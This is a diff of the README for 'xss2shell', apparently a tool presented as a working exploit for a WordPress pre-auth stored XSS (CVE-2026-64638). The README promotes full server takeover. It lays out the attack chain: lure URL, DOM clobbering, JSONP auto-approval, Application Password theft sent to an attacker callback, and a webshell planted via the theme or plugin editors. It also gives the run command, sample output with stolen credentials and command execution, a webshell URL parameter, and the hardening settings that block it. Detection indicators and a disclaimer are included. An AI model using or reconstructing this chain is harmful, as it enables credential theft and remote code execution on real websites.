@@ -1,26 +1,24 @@
 <div align="center">
 
 ```
- __  __ ___ ___ ___ ___ _  _  ___ _    _    
- \ \/ // __/ __| _ \ __| || |/ __| |  | |   
-  >  < \__ \__ \  _/ _|| __ | (__| |__| |__ 
- /_/\_\|___/___/_| |___|_||_|\___|____|____|
-                                     v1.0
+ ██╗  ██╗███████╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
+ ╚██╗██╔╝██╔════╝██╔════╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
+  ╚███╔╝ ███████╗███████╗ █████╔╝███████╗███████║█████╗  ██║     ██║
+  ██╔██╗ ╚════██║╚════██║██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
+ ██╔╝ ██╗███████║███████║███████╗███████║██║  ██║███████╗███████╗███████╗
+ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
 ```
-
-# xss2shell
-
-### WordPress Pre-Auth Stored XSS to Remote Code Execution
-
-**CVE-2026-64638** | WordPress < 7.0.3 | Zero-Click Admin Takeover
-
-[![Python](https://img.shields.io/badge/python-3.8+-blue.svg)](https://python.org)
-[![CVE](https://img.shields.io/badge/CVE--2026--64638-critical-red.svg)](https://nvd.nist.gov/vuln/detail/CVE-2026-64638)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 
 **One XSS. Full RCE. No authentication required.**
 
+[![CVE](https://img.shields.io/badge/CVE--2026--64638-CRITICAL-red?style=for-the-badge)](https://nvd.nist.gov/vuln/detail/CVE-2026-64638)
+[![WordPress](https://img.shields.io/badge/WordPress-%3C_7.0.3-blue?style=for-the-badge&logo=wordpress)](https://wordpress.org)
+[![Python](https://img.shields.io/badge/Python-3.8+-yellow?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
+[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
+
 Every public PoC for this CVE is broken. This one works.
+
+[Quick Start](#quick-start) · [How It Works](#how-it-works) · [Limitations](#limitations)
 
 ---
 
@@ -28,54 +26,77 @@ Every public PoC for this CVE is broken. This one works.
 
 ## The Bug
 
-WordPress < 7.0.3 reflects the `log` (username) parameter in `wp-login.php` without sanitization. The value is stored and rendered in the admin's authenticated context — turning a login form into a persistent XSS entry point that requires **zero authentication**.
+WordPress < 7.0.3 does not sanitize the `log` (username) parameter in `wp-login.php`. The value is stored and rendered inside the admin's authenticated session — a pre-auth stored XSS that chains directly to full server takeover.
 
 ## The Chain
 
 ```
-Victim visits attacker link
-        |
-        v
-Stored XSS fires in wp-login.php
-        |
-        v
-Application Password silently stolen
-        |
-        v
-Webshell written via theme/plugin editor
-        |
-        v
-Remote Code Execution
+ ┌──────────────────────┐
+ │ Admin clicks lure URL │
+ └──────────┬───────────┘
+            ▼
+ ┌──────────────────────┐
+ │ Stored XSS fires in  │
+ │ wp-login.php          │
+ └──────────┬───────────┘
+            ▼
+ ┌──────────────────────┐
+ │ Application Password │
+ │ silently stolen       │
+ └──────────┬───────────┘
+            ▼
+ ┌──────────────────────┐
+ │ Webshell written via │
+ │ theme/plugin editor   │
+ └──────────┬───────────┘
+            ▼
+ ┌──────────────────────┐
+ │   Remote Code        │
+ │   Execution ✓        │
+ └──────────────────────┘
 ```
 
-**4 steps. 1 click. Full server compromise.**
-
-| Step | What Happens | How |
-|------|-------------|-----|
-| 1 | XSS triggers | Malformed `log` param stored + reflected in admin session |
-| 2 | Credentials stolen | `authorize-application.php` auto-approves via JSONP + DOM clobbering |
-| 3 | Shell planted | 3 fallback methods: theme editor → plugin upload → plugin editor |
-| 4 | RCE confirmed | `shell_exec()` via webshell, output returned as JSON |
+**4 steps. 1 click. Full compromise.**
 
 ## Quick Start
 
 ```bash
-# No dependencies. Pure Python 3. Just run it.
+# Zero dependencies. Pure Python 3.
 python xss2shell.py -t http://target.com -c "id"
 ```
 
-The tool starts a local HTTP server and generates a lure URL. When the WordPress admin visits it:
-
 ```
-[+] Admin panel found: http://target.com/wp-login.php
-[+] Attacker server listening: 192.168.1.5:8443
-[*] Waiting for the admin to visit ...
+ ██╗  ██╗███████╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
+ ╚██╗██╔╝██╔════╝██╔════╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
+  ╚███╔╝ ███████╗███████╗ █████╔╝███████╗███████║█████╗  ██║     ██║
+  ██╔██╗ ╚════██║╚════██║██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
+ ██╔╝ ██╗███████║███████║███████╗███████║██║  ██║███████╗███████╗███████╗
+ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+
+ CVE-2026-64638 | WordPress < 7.0.3 | Pre-Auth XSS → RCE
+ https://wordsec.net | For authorized testing only
+
+[*] Target: http://target.com
+[+] WordPress login found
+[+] Listening on 192.168.1.5:9443
+[*] Send this to the admin → http://192.168.1.5:9443/
+[*] Waiting for victim ...
 [+] Victim opened the attacker page
+[+] Exploit chain started in victim's browser
+[+] XSS payload armed
 [+] XSS payload POSTed to wp-login.php
-[+] Application Password stolen: user=admin pass=XXXX XXXX XXXX
-[+] Theme editor: webshell injected into functions.php
-[+] Command output:
+[+] Application Password stolen: user=admin pass=XXXX XXXX XXXX XXXX
+[+] Theme editor → webshell in functions.php
+
+============================================================
+[+] RCE via theme
+[+] $ id
+------------------------------------------------------------
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+============================================================
+
+[+] Shell → http://target.com/?xss2shell_cmd=whoami
+[+] Done.
 ```
 
 ## Usage
@@ -83,88 +104,89 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 usage: xss2shell.py [-h] -t TARGET -c COMMAND [--lhost LHOST] [--lport LPORT] [--keep]
 
-  -t, --target   Target WordPress URL (e.g. http://wordpress.local)
-  -c, --command   OS command to execute (e.g. "id", "whoami", "cat /etc/passwd")
-  --lhost         Attacker IP (default: auto-detect)
-  --lport         Attacker port (default: random)
+options:
+  -t, --target    Target WordPress URL (http://target.com)
+  -c, --command   OS command to execute on the server
+  --lhost         Attacker callback IP (default: auto-detect)
+  --lport         Attacker callback port (default: random)
   --keep          Don't clean up artifacts after exploitation
+  --version       Show version
 ```
-
-## Why This Exists
-
-Every public PoC for CVE-2026-64638 either:
-- Only demonstrates the XSS (alert box — useless)
-- Fails to chain to any real impact
-- Breaks on default WordPress configurations
-- Requires manual steps a triager can't reproduce
-
-This tool delivers **end-to-end exploitation** — from zero auth to RCE — in a single command. Built for researchers who need a working PoC, not a theoretical write-up.
 
 ## How It Works
 
-**Stage 1 — Lure & XSS**
+### Stage 1 — XSS via `wp-login.php`
 
-The attacker hosts a page that opens a popup to `wp-login.php` with a crafted `log` parameter containing HTML injection. The payload uses DOM clobbering (`<area id=ajaxurl>`) to hijack WordPress's AJAX URL resolution, redirecting a JSONP callback to trigger the Application Password approval button via `window.opener`.
+The attacker hosts a page that opens a popup to `wp-login.php` with a crafted `log` parameter. The payload uses **DOM clobbering** (`<area id=ajaxurl>`) to hijack WordPress's internal AJAX URL, redirecting a JSONP callback to auto-click the Application Password approval button via `window.opener`.
 
-**Stage 2 — Credential Theft**
+### Stage 2 — Application Password Theft
 
-The parent window navigates to `authorize-application.php` with a pre-registered `app_id` and `success_url` pointing back to the attacker. When the XSS-triggered JSONP fires `window.opener.approve.click`, the Application Password is created and sent to the attacker's callback.
+The parent window navigates to `authorize-application.php` with a pre-registered `app_id` and a `success_url` pointing to the attacker's server. When the JSONP fires `window.opener.approve.click`, the Application Password is silently created and exfiltrated.
 
-**Stage 3 — Shell Deployment (3 fallback methods)**
+### Stage 3 — Shell Deployment
 
-| Priority | Method | Endpoint |
-|----------|--------|----------|
-| 1 | Theme File Editor | `theme-editor.php` — inject into `functions.php` |
-| 2 | Plugin ZIP Upload | `update.php?action=upload-plugin` — upload webshell as plugin |
-| 3 | Plugin File Editor | `plugin-editor.php` — inject into existing plugin file |
+Three fallback methods ensure RCE even on hardened configurations:
 
-Each method extracts CSRF nonces from the admin panel and writes PHP code that executes OS commands.
+| # | Method | Target | Writes to |
+|---|--------|--------|-----------|
+| 1 | Theme Editor | `theme-editor.php` | `functions.php` |
+| 2 | Plugin Upload | `update.php?action=upload-plugin` | `xss2shell/shell.php` |
+| 3 | Plugin Editor | `plugin-editor.php` | Existing plugin file |
 
-**Stage 4 — RCE**
+Each method extracts the CSRF nonce from the admin panel and injects PHP code server-side.
 
-The webshell responds to HTTP requests with JSON containing command output. The tool verifies RCE, executes the user's command, and optionally cleans up all artifacts.
+### Stage 4 — RCE
+
+The webshell executes OS commands via `shell_exec()` and returns output as JSON. The tool confirms execution, runs the attacker's command, and optionally cleans up all artifacts.
 
 ## Affected Versions
 
 | Version | Status |
 |---------|--------|
-| WordPress < 7.0.3 | Vulnerable |
-| WordPress >= 7.0.3 | Patched |
-
-## Detection
-
-Indicators of compromise if xss2shell was used against your site:
-
-- Application Password created for app name `XSS2Shell-Poc-Wordsec`
-- Plugin `xss2shell` installed in `wp-content/plugins/`
-- Modified `functions.php` containing `xss2shell_cmd`
-- Unusual JSONP requests to `/?rest_route=/&_method=GET&_jsonp=`
+| WordPress **< 7.0.3** | **Vulnerable** |
+| WordPress ≥ 7.0.3 | Patched |
 
 ## Limitations
 
-| Condition | Effect |
+| Condition | Impact |
 |-----------|--------|
-| `DISALLOW_FILE_EDIT = true` | Theme/plugin editors disabled — only ZIP upload works |
-| `DISALLOW_FILE_MODS = true` | All 3 methods blocked — no RCE |
-| WAF (Cloudflare, Wordfence) | May filter XSS payload or shell requests |
-| `disable_functions` in PHP | `shell_exec` blocked — webshell returns empty output |
-| Pop-up blocker | Popup chain breaks — requires user to allow popups |
-| CSP headers | May block inline scripts or cross-origin requests |
+| `DISALLOW_FILE_EDIT` | Theme/plugin editors blocked → only ZIP upload works |
+| `DISALLOW_FILE_MODS` | All 3 methods blocked → no RCE |
+| WAF (Cloudflare, Wordfence) | May filter XSS payload or webshell requests |
+| `disable_functions` | `shell_exec` blocked → empty output |
+| Pop-up blocker | Breaks the popup chain |
+| Strict CSP | Blocks inline JS or cross-origin fetch |
+
+## Detection
+
+If xss2shell was used against your site, look for:
+
+- Application Password for app `XSS2Shell-Poc-Wordsec`
+- Plugin `xss2shell` in `wp-content/plugins/`
+- String `xss2shell_cmd` in `functions.php` or any plugin file
+- JSONP requests to `/?rest_route=/&_method=GET&_jsonp=`
+
+## Why This Exists
+
+Every public PoC for CVE-2026-64638:
+- Stops at `alert(1)` — proves nothing
+- Requires manual steps a triager can't reproduce
+- Breaks on default WordPress installs
+
+This tool delivers **full exploitation in a single command**. Built for security researchers who need a working PoC, not a write-up.
 
 ## Disclaimer
 
-This tool is provided for **authorized security testing and educational purposes only**. Use it only against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The author is not responsible for any misuse.
+For **authorized security testing and educational purposes only**. Only use against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse.
 
 ## Credits
 
-- **Author**: [WordSec](https://wordsec.net/)
-- **CVE**: CVE-2026-64638
-- **Patched in**: WordPress 7.0.3
+**[WordSec](https://wordsec.net/)** · CVE-2026-64638 · Patched in WordPress 7.0.3
 
 ---
 
 <div align="center">
 
-**If this helped your research, drop a star.**
+**If this saved your research time, star it.** ⭐
 
 </div>
